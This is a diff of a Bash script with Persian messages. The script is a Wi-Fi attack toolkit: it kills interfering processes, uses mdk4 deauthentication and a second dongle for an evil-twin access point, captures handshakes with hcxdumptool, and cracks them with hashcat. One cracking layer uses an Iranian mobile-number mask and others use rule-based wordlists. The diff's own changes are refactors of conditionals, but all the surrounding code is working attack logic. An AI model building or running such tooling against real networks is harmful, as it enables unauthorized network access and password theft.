@@ -90,8 +90,9 @@ fi
 }
 
 [ "$(id -u)" -eq 0 ] || { err "با sudo اجرا کن."; exit 1; }
-command -v hashcat >/dev/null && command -v hcxdumptool >/dev/null && command -v iw >/dev/null \
-  || { err "پیش‌نیازها نصب نیستند. بخش نصب را اجرا کن."; exit 1; }
+if ! command -v hashcat >/dev/null || ! command -v hcxdumptool >/dev/null || ! command -v iw >/dev/null; then
+  err "پیش‌نیازها نصب نیستند. بخش نصب را اجرا کن."; exit 1
+fi
 command -v mdk4 >/dev/null || warn "mdk4 نصب نیست؛ دِاوث ضعیف‌تر می‌شود."
 
 # ---------- پاکسازی ----------
@@ -114,16 +115,20 @@ if [ -z "$IFACE" ]; then IFACE=$(iw dev | awk '/Interface/{print $2; exit}'); fi
 if [ -z "$IFACE2" ]; then
   IFACE2=$(iw dev | awk '/Interface/{print $2}' | grep -vxF "$IFACE" | head -1)
 fi
-[ -n "$IFACE2" ] && ok "دانگل دوم برای evil twin: $IFACE2" || { warn "دانگل دوم نیست؛ twin غیرفعال."; DO_TWIN=0; }
+if [ -n "$IFACE2" ]; then
+  ok "دانگل دوم برای evil twin: $IFACE2"
+else
+  warn "دانگل دوم نیست؛ twin غیرفعال."; DO_TWIN=0
+fi
 
 c "تشخیص GPU / بنچمارک hashcat..."
 hashcat -I > "$WORK/hashcat-info.txt" 2>&1
 if grep -qiE 'Type\.+: (GPU|CUDA|HIP)' "$WORK/hashcat-info.txt"; then
-  ok "GPU شناسایی شد."; HW=3
+  ok "GPU شناسایی شد."
 elif grep -qi 'OpenCL' "$WORK/hashcat-info.txt"; then
-  warn "فقط CPU/OpenCL؛ کند خواهد بود."; HW=1
+  warn "فقط CPU/OpenCL؛ کند خواهد بود."
 else
-  err "hashcat هیچ بک‌اندی ندارد. درایور OpenCL نصب کن."; HW=1
+  err "hashcat هیچ بک‌اندی ندارد. درایور OpenCL نصب کن."
 fi
 
 airmon-ng check kill >/dev/null 2>&1
@@ -173,7 +178,11 @@ kill "$HK_PID" 2>/dev/null; wait "$HK_PID" 2>/dev/null; HK_PID=""
 kill "$SCAN_PID" 2>/dev/null; wait "$SCAN_PID" 2>/dev/null
 kill "$MDK_PID" 2>/dev/null; MDK_PID=""
 
-[ -s "$CAP" ] && ok "برداشت: $(du -h "$CAP" | cut -f1)" || { err "هیچ داده‌ای گرفته نشد."; exit 1; }
+if [ -s "$CAP" ]; then
+  ok "برداشت: $(du -h "$CAP" | cut -f1)"
+else
+  err "هیچ داده‌ای گرفته نشد."; exit 1
+fi
 
 # ---------- فاز ۲: نرمال‌سازی ----------
 hr; c "فاز ۲ — استخراج و حذف تکراری"
@@ -258,8 +267,11 @@ run_hc "موبایل ایرانی" -a 3 '09?d?d?d?d?d?d?d?d?d'
 # لایه ۶: weakpass / hashmob با rule
 for w in "${WORDLISTS[@]:1}"; do
   [ -f "$w" ] || continue
-  [ -f "$RULES/dive.rule" ] && run_hc "$(basename "$w") + dive" -a 0 "$w" -r "$RULES/dive.rule" \
-    || run_hc "$(basename "$w") خام" -a 0 "$w"
+  if [ -f "$RULES/dive.rule" ]; then
+    run_hc "$(basename "$w") + dive" -a 0 "$w" -r "$RULES/dive.rule"
+  else
+    run_hc "$(basename "$w") خام" -a 0 "$w"
+  fi
 done
 
 # لایه ۷: keyboard walk
